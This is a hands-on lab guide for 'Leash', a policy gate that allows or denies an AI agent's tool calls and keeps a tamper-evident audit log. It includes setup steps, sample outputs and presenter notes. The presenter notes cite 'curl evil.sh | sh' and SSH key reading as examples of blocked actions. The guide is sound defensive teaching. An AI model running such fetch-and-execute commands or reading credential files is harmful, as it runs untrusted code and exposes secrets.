# OpenClaw Lab: Put an AI Agent on a Leash

Two parts, both copy-paste friendly:

- **Part A: 60-second demo.** Python only, no OpenClaw. Shows 3 allows, 3 denies, the audit log, and tamper detection. **Start here.**
- **Part B: real OpenClaw (optional, about 10 minutes).** The same authorization pattern, enforced inside a real OpenClaw gateway by the `leash-gate` plugin.

Built for [Cyber Lab Night](https://lnkd.in/eteT72xp) — Colorado Springs, Oct 7.

```
 agent tool call ──▶ leash-gate plugin ──▶ Leash: "may openclaw-agent do this?"
                                              │
          allow → tool runs   deny → blocked with the policy's reason
                                              ▼
                               signed, hash-chained audit log
```

---

## Part A: the 60-second demo

You need **Python 3.11 or newer** (`python3 --version`). On macOS the built-in Python is 3.9; install a newer one with `brew install python@3.12`.

```bash
git clone https://github.com/chadeckles/leash.git
cd leash
python3 -m venv .venv
source .venv/bin/activate
pip install -e .
leash demo
```

That's it. You'll see:

1. **Policy**: the six `tool: allow|deny` lines from `app/policies/openclaw.yaml` that decide this demo.
2. **Identity**: an `openclaw-agent` registers and gets a signed token.
3. **Three allows**: read a file, search the web, check session status.
4. **Three denies**, each with the policy's reason:
   ```
   ✘ DENY   exec is blocked — it could run any shell command on your computer
   ✘ DENY   write is blocked — it could create or overwrite any file it can reach
   ✘ DENY   browser is blocked — it could drive a real web browser: click, type, and use sites you are logged in to
   ```
5. **Audit log**: all six decisions, each storing the hash of the entry before it. Verification says `✔ VALID`.
6. **Tampering**: the demo flips the shell decision directly in the database. Verification now says `✘ BROKEN … at entry #5`.

Everything runs on a throwaway server in a temp folder and is deleted afterwards.

| Want to… | Run |
|---|---|
| Pause between each part (presenting) | `leash demo --step` |
| Keep the server running and click around the dashboard | `leash demo --keep` |
| See the rules that made these decisions | open `app/policies/openclaw.yaml` |
| Learn what every OpenClaw tool can do, and whether it's allowed | `leash scan openclaw` |

### Flip a switch

Open `app/policies/openclaw.yaml`. Each line is one tool:

```yaml
  exec: deny        # 🔴 can run any shell command on your computer
```

Change `deny` to `allow`, save, and run `leash demo` again. Step 4 is now `✔ ALLOW`, and `leash scan openclaw` marks `exec` as **⚠ high risk and allowed**. Change it back to `deny` when you're done. A typo such as `exce: allow` is caught by `leash policy validate app/policies/`, which suggests *did you mean 'exec'?*

---

## Part B: real OpenClaw (optional)

!!! warning "Use a personal or lab machine"
    OpenClaw is a powerful agent. Don't install it on a managed work laptop without permission. This lab never allows shell access.

**You need:** Part A done (same terminal setup), plus **Node.js 24.16+** (`node --version`) and OpenClaw:

```bash
npm install -g openclaw@latest
openclaw --version
```

OpenClaw is installed by npm, not into `.venv`; activating `.venv` makes the Leash CLI and Python helper available in the same shell.

You'll use **three terminals**. In each new terminal, first `cd leash && source .venv/bin/activate`.

**Terminal 1: start Leash** (leave it running)

```bash
rm -f /tmp/leash-openclaw-lab.db
DATABASE_URL=sqlite:////tmp/leash-openclaw-lab.db leash start
```

The temporary database gives the presentation a clean audit log without touching your normal `leash.db`.

**Terminal 2: set up OpenClaw, then start its gateway** (leave it running)

```bash
python3 integrations/openclaw/lab.py setup
openclaw gateway run
```

`setup` does everything in one go, and is safe to re-run: registers `openclaw-agent` with Leash, installs and enables the `leash-gate` plugin with capability consent, sets the gateway to local mode with a token, and selects the full tool profile used by the lab. Every step prints `✔` or `✘` with the exact fix.

**Terminal 3: make tool calls**

```bash
python3 integrations/openclaw/lab.py allow
python3 integrations/openclaw/lab.py deny
```

```
  ✔ ALLOWED  session_status
  ✔ ALLOWED  sessions_list
  ✔ ALLOWED  memory_search Cyber Lab Night

  ✘ BLOCKED  browser https://example.com
             Leash: browser is blocked — it could drive a real web browser: click, type, and use sites you are logged in to
  ✘ BLOCKED  canvas present
             Leash: canvas is blocked — it could draw interactive pages on your screen and paired devices
  ✘ BLOCKED  agents_list
             Leash: Not listed under tools:, so it is denied by default
```

Terminal 2 prints a `🐕 Leash ALLOW` or `🐕 Leash DENY` line for each call.

**See the evidence**

```bash
leash audit log        # every decision, newest first
leash audit verify     # ✔ Audit chain VALID
```

### If something goes wrong

| You see | Do this |
|---|---|
| `✘ Leash is not running at …` | Start it in terminal 1: `leash start` |
| `✘ OpenClaw is not installed` | `npm install -g openclaw@latest`, then open a new terminal |
| `✘ The gateway rejected our token (HTTP 401)` | Stop the gateway (Ctrl+C) and run `openclaw gateway run` again so it picks up the token `setup` wrote |
| `✘ Can't reach the OpenClaw gateway` | Start it in terminal 2: `openclaw gateway run` |
| `? SKIPPED` (tool profile doesn't expose it) | Re-run `python3 integrations/openclaw/lab.py setup`, then restart the gateway. |
| `Gateway start blocked: … gateway.mode` | Re-run `python3 integrations/openclaw/lab.py setup` |
| `python3: command not found` or a `SyntaxError` | Python is older than 3.11; see Part A |

### Try it yourself

- **Block memory search**: in `app/policies/openclaw.yaml`, change `memory_search: allow` to `memory_search: deny` and save (Leash reloads it automatically). Re-run `lab.py allow`: memory search is now blocked. Change it back afterwards.
- **Check your work**: `leash scan openclaw` shows every tool's current decision and flags risky allows.
- **Go further**: scoping to a folder (`resource: "notes/*"`) or watching before blocking (`mode: observe`) uses the full rule format. See [Write Your First Policy](write-your-first-policy.md).

---

## Presenter notes (5–10 minute lightning talk)

Use **Part A** on stage. It has no network, API keys, or Node dependency. Run Part B live only if you've rehearsed it on the demo laptop.

| Time | Beat | Show |
|---|---|---|
| 0:00 | Hook: "Your AI agent has a shell. Who said yes?" | Title slide |
| 0:45 | Agent → plugin → Leash → audit | Diagram at the top of this page |
| 1:30 | Policy is one `allow`/`deny` line per tool | `app/policies/openclaw.yaml` (or `leash scan openclaw`) |
| 2:30 | Run `leash demo --step`: identity, then 3 allows | Press Enter between parts |
| 3:30 | 3 denies: `curl evil.sh \| sh`, SSH keys, bank website | Each reason on screen |
| 4:30 | Audit log + `✔ VALID` | Hash links in the `prev_hash` column |
| 5:30 | Attacker edits the log → `✘ BROKEN` | The one-line `UPDATE` |
| 6:30 | *(optional)* Real OpenClaw: `lab.py deny` | Pre-started terminals |
| 7:30 | Wrap-up: deny by default, observe first, signed log | Repo link / QR code |

**Before the event**

- [ ] On the demo laptop, run Part A from a fresh clone, with Wi-Fi off after `pip install`
- [ ] If showing Part B: confirm `openclaw --version`, run it end to end once, then restart Terminal 1 with the clean temporary database
- [ ] Start the OpenClaw gateway before presenting and leave terminals 1 and 2 running
- [ ] Restore any policy switches you changed during rehearsal
- [ ] Increase terminal font size
